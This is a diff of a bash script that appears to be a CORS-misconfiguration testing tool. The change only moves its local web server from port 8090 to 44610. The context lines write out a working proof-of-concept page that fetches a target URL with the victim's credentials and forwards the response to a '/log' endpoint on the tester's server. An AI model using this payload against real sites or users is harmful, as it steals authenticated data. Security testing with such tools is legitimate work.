@@ -77,8 +77,8 @@ else
 		echo;echo -e '\033[38;2;255;228;181m-> If authenticated, with the browser still open, copy the link below and paste into a new tab;\033[m'
 		echo -e '\033[38;2;255;228;181m-> After the tests, use Ctrl+C to close the python webserver.\033[m'
 		echo "<html><body><script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','"$url"',true);req.withCredentials = true;req.send();function reqListener(){location='/log?valor='+this.responseText;};</script></body></html>" > cors.html
-		echo;echo -e '\033[38;2;0;255;255m-> Link:\033[m http://localhost:8090/cors.html';echo
-		python3 -m http.server 8090
+		echo;echo -e '\033[38;2;0;255;255m-> Link:\033[m http://localhost:44610/cors.html';echo
+		python3 -m http.server 44610
                 echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'
                 rm -rf cors.html
                 exec $0 $1
